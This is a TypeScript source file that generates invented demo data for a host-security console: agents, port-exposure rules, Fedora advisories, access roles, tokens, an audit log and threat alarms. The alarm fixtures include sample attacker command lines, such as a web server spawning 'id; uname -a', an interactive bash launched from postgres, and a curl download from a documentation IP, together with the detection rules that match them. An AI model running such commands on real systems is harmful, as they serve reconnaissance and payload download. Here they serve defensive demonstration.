// Deterministic synthetic data for the in-browser demo. Everything here is
// invented; host names use the reserved example.test domain.
import type {
  AccessInventory, Agent, AuditEvent, Certificate, Cve, EnrollmentToken, Finding as FindingView,
  RuleBundle, RuleSet, ServiceAccount, ServiceToken, Severity, Tag, Triage, Vulnerability,
} from "../api/types";

function prng(seed: number) {
  let state = seed >>> 0;
  return () => {
    state = (state + 0x6d2b79f5) >>> 0;
    let t = state;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const MINUTE = 60_000;
const DAY = 24 * 60 * MINUTE;

export type DemoRule = {
  ruleSetId: string;
  ruleId: string;
  severity: Severity;
  message: string;
  /** The fact the rule reads. */
  evidence: string;
  expression: string;
  hitRate: number;
};

// The rules OpenVIBES ships: openvibes-rules baseline/rules.json (ids, severities,
// messages and expressions copied as they are), so the demo never shows a check
// the product does not have. hitRate is demo-only.
const RULES: readonly DemoRule[] = [
  { ruleSetId: "baseline", ruleId: "port.docker_api.exposed", severity: "critical", message: "The unencrypted Docker API (tcp 2375) listens on a non-loopback address; anyone who reaches it controls the host. Bind it to a Unix socket or loopback, or use TLS on 2376.", evidence: "port.tcp.exposed", expression: "'2375' in facts['port.tcp.exposed']", hitRate: 0.02 },
  { ruleSetId: "baseline", ruleId: "port.telnet.exposed", severity: "high", message: "Telnet (tcp 23) listens on a non-loopback address; it sends passwords in clear text. Disable it and use SSH.", evidence: "port.tcp.exposed", expression: "'23' in facts['port.tcp.exposed']", hitRate: 0.02 },
  { ruleSetId: "baseline", ruleId: "port.rsh.exposed", severity: "high", message: "rexec, rlogin or rsh (tcp 512-514) listens on a non-loopback address; these trust host names and send credentials in clear text. Disable them and use SSH.", evidence: "port.tcp.exposed", expression: "'512' in facts['port.tcp.exposed'] || '513' in facts['port.tcp.exposed'] || '514' in facts['port.tcp.exposed']", hitRate: 0.01 },
  { ruleSetId: "baseline", ruleId: "port.vnc.exposed", severity: "high", message: "VNC (tcp 5900) listens on a non-loopback address; it is often weakly authenticated and unencrypted. Bind it to loopback and tunnel it over SSH, or firewall it.", evidence: "port.tcp.exposed", expression: "'5900' in facts['port.tcp.exposed']", hitRate: 0.03 },
  { ruleSetId: "baseline", ruleId: "port.redis.exposed", severity: "high", message: "Redis (tcp 6379) listens on a non-loopback address; by default it has no password and can be used to write files. Bind it to loopback, or firewall it and require authentication.", evidence: "port.tcp.exposed", expression: "'6379' in facts['port.tcp.exposed']", hitRate: 0.04 },
  { ruleSetId: "baseline", ruleId: "port.mongodb.exposed", severity: "high", message: "MongoDB (tcp 27017) listens on a non-loopback address. Bind it to loopback, or firewall it and enable authentication.", evidence: "port.tcp.exposed", expression: "'27017' in facts['port.tcp.exposed']", hitRate: 0.02 },
  { ruleSetId: "baseline", ruleId: "port.elasticsearch.exposed", severity: "high", message: "Elasticsearch (tcp 9200) listens on a non-loopback address. Bind it to loopback, or firewall it and enable security.", evidence: "port.tcp.exposed", expression: "'9200' in facts['port.tcp.exposed']", hitRate: 0.02 },
  { ruleSetId: "baseline", ruleId: "port.memcached.exposed", severity: "high", message: "memcached (tcp 11211) listens on a non-loopback address; it has no authentication and can leak cached data. Bind it to loopback, or firewall it.", evidence: "port.tcp.exposed", expression: "'11211' in facts['port.tcp.exposed']", hitRate: 0.02 },
  { ruleSetId: "baseline", ruleId: "port.ftp.exposed", severity: "medium", message: "FTP (tcp 21) listens on a non-loopback address; it sends passwords in clear text. Use SFTP, or firewall it.", evidence: "port.tcp.exposed", expression: "'21' in facts['port.tcp.exposed']", hitRate: 0.03 },
  { ruleSetId: "baseline", ruleId: "port.smb.exposed", severity: "medium", message: "SMB (tcp 139 or 445) listens on a non-loopback address. Firewall it to the networks that need file sharing.", evidence: "port.tcp.exposed", expression: "'139' in facts['port.tcp.exposed'] || '445' in facts['port.tcp.exposed']", hitRate: 0.08 },
  { ruleSetId: "baseline", ruleId: "port.snmp.exposed", severity: "medium", message: "SNMP (udp 161) listens on a non-loopback address; v1/v2c community strings are sent in clear text. Firewall it, or use SNMPv3.", evidence: "port.udp.exposed", expression: "'161' in facts['port.udp.exposed']", hitRate: 0.05 },
  { ruleSetId: "baseline", ruleId: "port.postgresql.exposed", severity: "medium", message: "PostgreSQL (tcp 5432) listens on a non-loopback address. Bind it to loopback, or firewall it to the hosts that need it.", evidence: "port.tcp.exposed", expression: "'5432' in facts['port.tcp.exposed']", hitRate: 0.06 },
  { ruleSetId: "baseline", ruleId: "port.mysql.exposed", severity: "medium", message: "MySQL or MariaDB (tcp 3306) listens on a non-loopback address. Bind it to loopback, or firewall it to the hosts that need it.", evidence: "port.tcp.exposed", expression: "'3306' in facts['port.tcp.exposed']", hitRate: 0.05 },
  { ruleSetId: "baseline", ruleId: "port.ssh.exposed", severity: "low", message: "SSH (tcp 22) listens on a non-loopback address. If the host is reachable from untrusted networks, allow keys only and firewall it.", evidence: "port.tcp.exposed", expression: "'22' in facts['port.tcp.exposed']", hitRate: 0.55 },
  { ruleSetId: "baseline", ruleId: "package.telnet_server.installed", severity: "low", message: "The telnet-server package is installed. Remove it and use SSH.", evidence: "package.names", expression: "'telnet-server' in facts['package.names']", hitRate: 0.03 },
  { ruleSetId: "baseline", ruleId: "package.rsh_server.installed", severity: "low", message: "The rsh-server package is installed. Remove it and use SSH.", evidence: "package.names", expression: "'rsh-server' in facts['package.names']", hitRate: 0.01 },
];

const ROLES = ["web", "api", "db", "cache", "mail", "vpn", "build", "files", "k8s-node", "ws", "nas", "backup", "proxy", "dns"] as const;

type Pkg = { name: string; installed: string; fixed: string | null };
type DemoAdvisory = {
  id: string;
  title: string;
  severity: Vulnerability["severity"];
  packages: Pkg[];
  cves: Cve[];
  hitRate: number;
  kernel: boolean;
};

const PACKAGES = [
  ["openssl", "3.2.2-3.fc44", "3.2.2-5.fc44"], ["glibc", "2.40-6.fc44", "2.40-9.fc44"], ["kernel", "6.11.4-301.fc44", "6.11.7-300.fc44"],
  ["curl", "8.9.1-2.fc44", "8.9.1-3.fc44"], ["sudo", "1.9.15-4.fc44", "1.9.15-6.fc44"], ["openssh", "9.8p1-3.fc44", "9.8p1-5.fc44"],
  ["systemd", "256.7-1.fc44", "256.8-1.fc44"], ["python3", "3.13.0-1.fc44", "3.13.1-1.fc44"], ["nginx", "1.26.2-1.fc44", "1.26.2-3.fc44"],
  ["podman", "5.2.5-1.fc44", "5.3.0-1.fc44"], ["git", "2.47.0-1.fc44", "2.47.1-1.fc44"], ["libxml2", "2.12.8-2.fc44", null],
  ["vim", "9.1.785-1.fc44", "9.1.825-1.fc44"], ["expat", "2.6.3-1.fc44", "2.6.4-1.fc44"], ["polkit", "125-1.fc44", null],
  ["redis", "7.2.6-1.fc44", "7.2.7-1.fc44"], ["postgresql", "16.4-2.fc44", "16.5-1.fc44"], ["bind", "9.18.30-1.fc44", "9.18.31-1.fc44"],
] as const;

const WEAKNESSES = ["CWE-787", "CWE-416", "CWE-79", "CWE-20", "CWE-125", "CWE-22", "CWE-352", "CWE-400"];

export type DemoData = ReturnType<typeof buildDemoData>;

export function buildDemoData(now = Date.now()) {
  const random = prng(20260928);
  const pick = <T,>(items: readonly T[]): T => items[Math.floor(random() * items.length)] as T;
  const iso = (ms: number) => new Date(ms).toISOString();

  const agents: Agent[] = [];
  const tags = new Map<string, Tag[]>();
  const certificates = new Map<string, Certificate[]>();
  for (let n = 1; n <= 186; n += 1) {
    const role = ROLES[n % ROLES.length] as string;
    const id = `agent-${String(n).padStart(5, "0")}`;
    const roll = random();
    const status: Agent["status"] = n % 47 === 0 ? "revoked" : n % 31 === 0 ? "imported" : roll < 0.09 ? "stale" : "active";
    const enrolled = now - (20 + Math.floor(random() * 300)) * DAY;
    const lastSeen = status === "stale" ? now - (1 + random() * 9) * DAY : status === "active" ? now - random() * 4 * MINUTE : now - 12 * DAY;
    agents.push({
      id,
      hostname: `${role}-${String(Math.ceil(n / ROLES.length)).padStart(2, "0")}.${n % 3 === 0 ? "prod" : n % 3 === 1 ? "lab" : "office"}.example.test`,
      status,
      enrolled_at: iso(enrolled),
      last_seen_at: status === "imported" ? null : iso(lastSeen),
      revoked_at: status === "revoked" ? iso(now - 11 * DAY) : null,
      scanner_version: status === "imported" ? null : pick(["0.4.2", "0.4.2", "0.4.2", "0.4.1", "0.3.9"]),
      capabilities: status === "imported" ? [] : ["findings", "heartbeat", "inventory"],
      // Deterministic (no random() call, so the rest of the fleet is unchanged): every 7th host is a version behind.
      rule_sets: status === "imported" ? [] : [
        { id: "baseline", version: n % 7 === 0 ? 1 : 2, expires_at_ms: now + 700 * DAY },
        ...(n % 2 === 0 ? [{ id: "baseline-alarms", version: 1, expires_at_ms: now + 700 * DAY }] : []),
      ],
      rule_sets_at: status === "imported" ? null : iso(lastSeen),
      // Deterministic, like rule_sets: most on eBPF, every 9th on audit, every 23rd off by a fault, every 29th not enabled.
      alarms: status === "imported" ? null
        : n % 29 === 0 ? { state: "off", fault: false, source: null, reason: "not_enabled", text: "process events are not enabled on this host", fix: "add \"process_events\" to collectors in /etc/openvibes-agent/agent.toml, then restart the agent", command: null }
        : n % 23 === 0 ? { state: "off", fault: true, source: null, reason: "audit_not_set_up", text: "this kernel has no BTF, and no program start seen through audit yet: the exec audit rule is probably not loaded, or auditd is not running", fix: "make sure auditd is installed and running, then run the command below", command: "sudo /usr/libexec/openvibes-agent/audit-fallback" }
        : { state: "on", fault: false, source: n % 9 === 0 ? "audit" : "ebpf", reason: null, text: null, fix: null, command: null },
    });
    tags.set(id, [{ key: "env", value: n % 3 === 0 ? "prod" : n % 3 === 1 ? "lab" : "office" }, { key: "role", value: role }]);
    const issued = now - Math.floor(random() * 60) * DAY;
    certificates.set(id, [
      { serial: `${(n * 7919).toString(16).padStart(8, "0")}a1`, issued_at: iso(issued), not_before: iso(issued), not_after: iso(issued + 90 * DAY) },
      { serial: `${(n * 104729).toString(16).padStart(8, "0")}b2`, issued_at: iso(issued - 90 * DAY), not_before: iso(issued - 90 * DAY), not_after: iso(issued) },
    ]);
  }
  const reporting = agents.filter((agent) => agent.status !== "revoked");

  const findings: FindingView[] = [];
  const triage = new Map<string, Triage>();
  for (const rule of RULES) {
    for (const agent of reporting) {
      if (random() >= rule.hitRate) continue;
      const first = now - (1 + random() * 40) * DAY;
      findings.push({
        id: `finding-${findings.length + 1}`,
        agent_id: agent.id,
        hostname: agent.hostname ?? null,
        rule_set_id: rule.ruleSetId,
        rule_id: rule.ruleId,
        rule_version: 3,
        severity: rule.severity,
        confidence: 70 + Math.floor(random() * 30),
        message: rule.message,
        evidence: [rule.evidence],
        detection: {
          observed_at_unix_ms: Math.floor(now - MINUTE), rule_set_version: 4, preimage_sha256: "a".repeat(64), truncated: false,
          inputs: [{ key: rule.evidence, status: "summarized", value: null, item_count: 2 }],
          steps: [{ expression: rule.expression, result: true }],
        },
        scan_id: `scan-${agent.id}-${Math.floor(now / DAY)}`,
        authenticated: agent.status !== "imported",
        origin: agent.status === "imported" ? "import" : "online",
        first_observed_at: iso(first),
        last_observed_at: iso(agent.last_seen_at ? Date.parse(agent.last_seen_at) : first),
        received_at: iso(agent.last_seen_at ? Date.parse(agent.last_seen_at) : first),
      });
      // The same draws as before triage v2 (so the rest of the demo stays
      // put): what was "investigating" is now an open finding with an assignee.
      const drawn = random() < 0.72 ? "open" : pick(["assigned", "mitigated", "accepted_risk", "false_positive"]);
      const state = drawn === "assigned" ? "open" : drawn;
      triage.set(`${agent.id}|${rule.ruleSetId}|${rule.ruleId}`, {
        state, version: 1, rule_version: 3,
        assigned_to: drawn === "assigned" ? "analyst" : null,
        note: ({ accepted_risk: "Isolated lab network; revisit next quarter.", open: null } as Record<string, string | null>)[state]
          ?? "Handled outside the console.",
        accepted_until: state === "accepted_risk" ? iso(now + 60 * DAY) : null,
      });
    }
  }

  const advisories: DemoAdvisory[] = [];
  for (let n = 0; n < 42; n += 1) {
    const [name, installed, fixed] = PACKAGES[n % PACKAGES.length] as readonly [string, string, string | null];
    const severity = pick(["critical", "important", "important", "moderate", "moderate", "low", "unrated"] as const);
    const cves: Cve[] = Array.from({ length: 1 + Math.floor(random() * 3) }, (_, index) => {
      const cvss = severity === "critical" ? 9 + random() : severity === "important" ? 7 + random() * 2 : 3 + random() * 4;
      const kev = severity === "critical" && random() < 0.5;
      return {
        cve_id: `CVE-2026-${String(10000 + n * 37 + index * 5).padStart(5, "0")}`,
        cvss_score: Math.round(cvss * 10) / 10,
        cvss_version: "3.1",
        cwe: [pick(WEAKNESSES)],
        description: `A flaw in ${name} ${index === 0 ? "allows a remote attacker to execute code through crafted input" : "may disclose memory contents to a local user"}.`,
        epss: Math.round((kev ? 0.4 + random() * 0.55 : random() * 0.2) * 1000) / 1000,
        euvd_exploited: kev ? iso(now - 30 * DAY) : null,
        kev,
      };
    });
    advisories.push({
      id: `FEDORA-2026-${(0x3a1f9c0d + n * 7919).toString(16)}`,
      title: `${name} security update`,
      severity,
      packages: [{ name, installed, fixed: n % 9 === 5 ? null : fixed }],
      cves,
      hitRate: severity === "critical" ? 0.06 : 0.03 + random() * 0.12,
      kernel: name === "kernel",
    });
  }

  const vulnerabilities: Vulnerability[] = [];
  for (const advisory of advisories) {
    for (const agent of reporting) {
      if (random() >= advisory.hitRate) continue;
      const first = advisory.cves[0];
      const reboot = advisory.kernel && random() < 0.5;
      vulnerabilities.push({
        advisory_id: advisory.id,
        agent_id: agent.id,
        hostname: agent.hostname ?? null,
        title: advisory.title,
        severity: advisory.severity,
        url: `https://bodhi.fedoraproject.org/updates/${advisory.id}`,
        cves: advisory.cves.map((cve) => cve.cve_id),
        cvss: first?.cvss_score ?? null,
        epss: first?.epss ?? null,
        epss_percentile: first?.epss == null ? null : Math.min(0.999, first.epss * 1.6),
        kev: advisory.cves.some((cve) => cve.kev),
        kev_due: advisory.cves.some((cve) => cve.kev) ? iso(now + 14 * DAY) : null,
        euvd: advisory.cves.some((cve) => cve.euvd_exploited != null),
        exploited: advisory.cves.some((cve) => cve.kev),
        ransomware: advisory.cves.some((cve) => cve.kev) && advisory.packages[0]?.name === "openssl",
        reboot_needed: reboot,
        packages: reboot ? advisory.packages.map((pkg) => ({ ...pkg, installed: pkg.fixed })) : advisory.packages,
        first_seen_at: iso(now - (1 + random() * 20) * DAY),
        fixed_at: null,
        source: "fedora-44-x86_64",
        match_method: advisory.packages[0]?.fixed == null ? "distribution-unfixed" : "distribution-advisory",
        confidence: advisory.packages[0]?.fixed == null ? 90 : 98,
        match_basis: advisory.packages[0]?.fixed == null
          ? "The Fedora tracker lists this package version as affected and has no fix yet."
          : "Fedora's own security advisory names this package; the installed version is older than the fixed one.",
        triage_state: "open", triage_version: 0, assigned_to: null as string | null,
      });
    }
  }

  const people = [
    ["u-admin", "admin", "Alex Admin"], ["u-sam", "sam", "Sam Analyst"], ["u-ola", "ola", "Ola Operator"],
    ["u-vic", "vic", "Vic Viewer"], ["u-lab", "lab-ops", "Lab operator"],
  ] as const;
  const access: AccessInventory = {
    roles: [
      { role_id: "viewer", display_name: "Viewer", builtin: true, permissions: ["agents.read", "compliance.read", "vulnerabilities.read", "alarms.read"] },
      { role_id: "analyst", display_name: "Analyst", builtin: true, permissions: ["agents.read", "compliance.read", "cases.read", "cases.manage", "vulnerabilities.read", "compliance.triage", "vulnerabilities.triage", "assistant.use", "alarms.read", "alarms.triage", "alarms.suppress"] },
      { role_id: "operator", display_name: "Operator", builtin: true, permissions: ["agents.read", "agents.revoke", "compliance.read", "vulnerabilities.read", "tokens.read", "tokens.create", "tokens.revoke", "rules.upload", "rules.write", "alarms.read"] },
      { role_id: "admin", display_name: "Admin", builtin: true, permissions: ["agents.read", "agents.revoke", "compliance.read", "vulnerabilities.read", "compliance.triage", "vulnerabilities.triage", "tokens.read", "tokens.create", "tokens.revoke", "rules.read", "rules.upload", "rules.write", "audit.read", "audit.export", "audit.retention.manage", "rbac.read", "rbac.manage", "asset_groups.manage", "service_accounts.read", "service_accounts.manage", "assistant.use", "dashboards.share", "alarms.read", "alarms.triage", "alarms.suppress", "cases.read", "cases.manage"] },
    ],
    users: people.map(([user_id, username, display_name]) => ({ user_id, username, display_name })),
    asset_groups: [
      { asset_group_id: "grp-prod", name: "Production", selectors: ["env=prod"] },
      { asset_group_id: "grp-lab", name: "Lab", selectors: ["env=lab"] },
    ],
    bindings: [
      ["b-1", "u-admin", "admin", null], ["b-2", "u-sam", "analyst", null], ["b-3", "u-ola", "operator", "grp-prod"],
      ["b-4", "u-vic", "viewer", null], ["b-5", "u-lab", "operator", "grp-lab"],
    ].map(([binding_id, user_id, role_id, group]) => {
      const person = people.find(([id]) => id === user_id);
      return {
        binding_id: binding_id as string, user_id: user_id as string, role_id: role_id as string,
        username: person?.[1] ?? "", display_name: person?.[2] ?? "",
        asset_group_id: (group ?? null) as string | null, asset_group_name: group === "grp-prod" ? "Production" : group === "grp-lab" ? "Lab" : null,
        created_at: iso(now - 40 * DAY), created_by: "admin",
      };
    }),
  };

  const enrollmentTokens: EnrollmentToken[] = [
    { token_id: "tok-standing", label: "standing token", created_at: iso(now - 30 * DAY), expires_at: iso(now + 36500 * DAY), max_uses: 2147483647, uses: 41, revoked: false, standing: true },
    { token_id: "tok-7f3a", label: "Office laptops", created_at: iso(now - 2 * DAY), expires_at: iso(now + 5 * DAY), max_uses: 25, uses: 9, revoked: false, standing: false },
    { token_id: "tok-19c2", label: "k8s node pool", created_at: iso(now - 6 * DAY), expires_at: iso(now + 1 * DAY), max_uses: 10, uses: 10, revoked: false, standing: false },
    { token_id: "tok-88e0", label: "Lab rebuild", created_at: iso(now - 20 * DAY), expires_at: iso(now - 13 * DAY), max_uses: 5, uses: 3, revoked: false, standing: false },
    { token_id: "tok-02bd", label: "Leaked in a ticket", created_at: iso(now - 9 * DAY), expires_at: iso(now + 20 * DAY), max_uses: 50, uses: 1, revoked: true, standing: false },
  ];

  const ruleSets: RuleSet[] = ["baseline", "baseline-alarms", "site"].map((rule_set_id, index) => ({
    rule_set_id, retired: false, trusted_keys: index === 0 ? 2 : 1, current_signer_removed: false,
    current_version: 14 - index * 4, current_issuer_key_id: index === 0 ? "ops-2026" : "ops-2025",
    current_expires_at_ms: now + (30 + index * 20) * DAY,
  }));
  const bundles = new Map<string, RuleBundle[]>(ruleSets.map((set) => [set.rule_set_id, Array.from({ length: 4 }, (_, index) => ({
    version: (set.current_version ?? 1) - index,
    bytes: 18_000 + index * 911,
    created_at_ms: now - (index * 9 + 1) * DAY,
    published_at: iso(now - (index * 9 + 1) * DAY + 3 * MINUTE),
    published_by: index % 2 === 0 ? "admin" : "ola",
    envelope_sha256: ((index + 3) * 0x9e3779b1 >>> 0).toString(16).padStart(8, "0").repeat(8),
    expires_at_ms: now + (40 - index * 9) * DAY,
    issuer_key_id: set.current_issuer_key_id ?? "ops-2026",
  }))]));

  const serviceAccounts: ServiceAccount[] = [
    { service_account_id: "sa-siem", name: "SIEM export", role_ids: ["viewer"], enabled: true, active_tokens: 1, created_at: iso(now - 60 * DAY) },
    { service_account_id: "sa-ci", name: "CI rule publisher", role_ids: ["operator"], enabled: true, active_tokens: 2, created_at: iso(now - 30 * DAY) },
    { service_account_id: "sa-old", name: "Old dashboard", role_ids: ["viewer"], enabled: false, active_tokens: 0, created_at: iso(now - 200 * DAY) },
  ];
  const serviceTokens = new Map<string, ServiceToken[]>([
    ["sa-siem", [{ token_id: "st-1", label: "splunk forwarder", created_at: iso(now - 50 * DAY), expires_at: iso(now + 40 * DAY), revoked: false }]],
    ["sa-ci", [
      { token_id: "st-2", label: "github actions", created_at: iso(now - 10 * DAY), expires_at: iso(now + 80 * DAY), revoked: false },
      { token_id: "st-3", label: "gitlab runner", created_at: iso(now - 25 * DAY), expires_at: iso(now + 5 * DAY), revoked: false },
    ]],
    ["sa-old", [{ token_id: "st-4", label: "grafana", created_at: iso(now - 190 * DAY), expires_at: iso(now - 10 * DAY), revoked: true }]],
  ]);

  const actions = [
    ["user.login", "user", "console", null], ["finding.triage", "finding", "baseline/port.ssh.exposed", "finding"],
    ["enrollment_token.create", "token", "tok-7f3a", "enrollment_token"], ["agent.revoke", "agent", "agent-00047", "agent"],
    ["rule_bundle.publish", "rule_set", "site", "rule_set"], ["access.binding.create", "binding", "b-5", "binding"],
    ["service_token.create", "service_account", "sa-ci", "service_account"], ["user.login", "user", "console", null],
  ] as const;
  const audit: AuditEvent[] = Array.from({ length: 140 }, (_, index) => {
    const [action, , target, targetKind] = actions[index % actions.length] as (typeof actions)[number];
    const person = people[index % people.length] as (typeof people)[number];
    const failed = action === "user.login" && index % 13 === 0;
    return {
      id: String(140 - index), action, actor: person[1], actor_id: person[0], actor_kind: "user",
      at: iso(now - index * 47 * MINUTE), authentication_method: "local_password",
      result: failed ? "failure" : "success", reason_code: failed ? "invalid_credentials" : null,
      request_id: `req-${(index * 2654435761 >>> 0).toString(16)}`, target, target_id: target, target_kind: targetKind,
    };
  });

  // Threat alarms (P14): a few process starts that matched a rule.
  const proc = (pid: number, exe: string, args: string[], uid = 33, cwd?: string) =>
    ({ pid, exe, args, uid, euid: uid, truncated: false, ...(cwd ? { cwd } : {}) });
  const alarmSpecs = [
    { rule: "web-server-spawns-shell", severity: "high", message: "A web server started a shell", count: 3, minutes: 12,
      process: proc(48211, "/usr/bin/sh", ["sh", "-c", "id; uname -a"], 33, "/var/www/html"),
      ancestors: [proc(1102, "/usr/sbin/nginx", ["nginx: worker process"], 33, "/"), proc(1100, "/usr/sbin/nginx", ["nginx: master process /usr/sbin/nginx"], 0, "/")] },
    { rule: "shell-from-database", severity: "critical", message: "A database server started a shell", count: 1, minutes: 95,
      process: proc(77310, "/usr/bin/bash", ["bash", "-i"], 26, "/var/lib/pgsql"),
      ancestors: [proc(2210, "/usr/bin/postgres", ["postgres: checkpointer"], 26, "/var/lib/pgsql")] },
    { rule: "download-and-run", severity: "high", message: "A shell downloaded a program and ran it", count: 1, minutes: 300,
      process: proc(90122, "/usr/bin/curl", ["curl", "-o", "x", "https://203.0.113.9/x"], 1000, "/home/ola"),
      ancestors: [proc(9001, "/usr/bin/bash", ["bash"], 1000, "/home/ola")] },
    { rule: "web-server-spawns-shell", severity: "high", message: "A web server started a shell", count: 41, minutes: 2,
      process: proc(51002, "/usr/bin/sh", ["sh", "-c", "/usr/local/bin/healthcheck"], 33, "/"),
      ancestors: [proc(1102, "/usr/sbin/nginx", ["nginx: worker process"], 33, "/")] },
  ];
  const alarms = alarmSpecs.map((spec, index) => {
    const agent = agents[(index * 7) % agents.length];
    const last = now - spec.minutes * MINUTE;
    return {
      id: String(9000 + index), agent_id: agent?.id ?? "agent-00001", hostname: agent?.hostname ?? null,
      rule_set_id: "baseline", rule_id: spec.rule, severity: spec.severity, message: spec.message,
      exe: spec.process.exe, parent_exe: spec.ancestors[0]?.exe ?? null, count: spec.count,
      first_seen: iso(last - spec.count * 3 * MINUTE), last_seen: iso(last),
      state: "open", suppressed_by: null as string | null,
      rule_set_version: 4, rule_version: 1, confidence: 80, process: spec.process, ancestors: spec.ancestors,
      received_at: iso(last + 2000),
      detection: {
        observed_at_unix_ms: Math.floor(last), rule_set_version: 4, preimage_sha256: "b".repeat(64), truncated: false,
        inputs: [{ key: "process.exe", status: "complete", value: spec.process.exe, item_count: null },
          { key: "parent.exe", status: "complete", value: spec.ancestors[0]?.exe ?? "", item_count: null }],
        steps: [{ expression: `event["process.exe"] == ${JSON.stringify(spec.process.exe)} && event["parent.exe"] == ${JSON.stringify(spec.ancestors[0]?.exe ?? "")}`, result: true }],
      },
      triage: { state: "open", assigned_to: (index === 2 ? "analyst" : null) as string | null, note: null as string | null,
        accepted_until: null as string | null, version: index === 2 ? 2 : 1, updated_at: null as string | null, updated_by: null as string | null },
    };
  });
  const alarmSuppressions: { id: string; rule_set_id: string; rule_id: string; scope: string; agent_id: string | null;
    exe: string | null; args_sha256: string | null; note: string; created_by: string; created_at: string }[] = [];

  return {
    now, rules: RULES, agents, tags, certificates, findings, triage, advisories, vulnerabilities, access,
    enrollmentTokens, ruleSets, bundles, serviceAccounts, serviceTokens, audit, alarms, alarmSuppressions,
    dashboards: [
      { dashboard_id: "d-admin-morning", owner: "u-admin", name: "My morning check", shared_role_id: null as string | null,
        layout: { schema: 1 as const, widgets: [
          { id: "exploited", type: "number" as const, x: 0, y: 0, w: 3, h: 2, config: { metric: "vulns.exploited" } },
          { id: "stale", type: "number" as const, x: 3, y: 0, w: 3, h: 2, config: { metric: "agents.stale" } },
          { id: "attention", type: "attention" as const, x: 0, y: 2, w: 8, h: 6, config: { include: ["exploited", "compliance"], limit: 8 } },
          { id: "note", type: "note" as const, x: 8, y: 2, w: 4, h: 3, config: { text: ["Patch window: Thursday 20:00", "https://wiki.example.test/patching"] } },
        ] } },
      { dashboard_id: "d-ola-triage", owner: "u-ola", name: "Analyst triage", shared_role_id: "analyst" as string | null,
        layout: { schema: 1 as const, widgets: [
          { id: "critical", type: "list" as const, x: 0, y: 0, w: 8, h: 6, config: { view: "/compliance", query: "severity=critical", limit: 10 } },
          { id: "trend", type: "trend" as const, x: 8, y: 0, w: 4, h: 3, config: { finding: "baseline/port.ssh.exposed", days: 14 } },
        ] } },
    ],
    retention: { retention_days: 365, updated_at: iso(now - 90 * DAY), updated_by: "admin", version: 1 },
  };
}
